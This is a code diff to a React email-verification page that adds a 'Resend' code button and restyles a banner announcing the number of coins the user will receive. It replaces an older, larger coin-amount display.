@@ -141,10 +141,21 @@ const VerifyEmailPage = () => {
         </div>
 
         <Button onClick={handleContinue} className="w-full bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold py-6 text-lg rounded-lg transition-all mb-4">
-          Continue
-        </Button>
+  Continue
+</Button>
 
-        <div className="inline-flex items-center gap-2 bg-[#1a1a1c] border border-cyan-400/30 rounded-lg px-5 py-2">
+<div className="text-center mb-8">
+  <span className="text-gray-400 text-sm">Didn't receive the code? </span>
+  <button
+    onClick={handleResend}
+    className="text-[#fe2c55] text-sm font-semibold hover:underline"
+  >
+    Resend
+  </button>
+</div>
+
+        <div className="mt-8 text-center">
+          <div className="inline-flex items-center gap-2 bg-[#1a1a1c] border border-cyan-400/30 rounded-lg px-5 py-2">
   <span className="text-gray-400 text-sm">You will receive: </span>
 
   <img
@@ -160,12 +171,6 @@ const VerifyEmailPage = () => {
   <span className="text-gray-400 text-xs"> Coins</span>
 </div>
 
-        <div className="text-center">
-          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
-            <span className="text-gray-400 text-lg">You will receive: </span>
-            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
-            <span className="text-gray-400 text-lg"> Coins</span>
-          </div>
         </div>
       </main>
     </div>
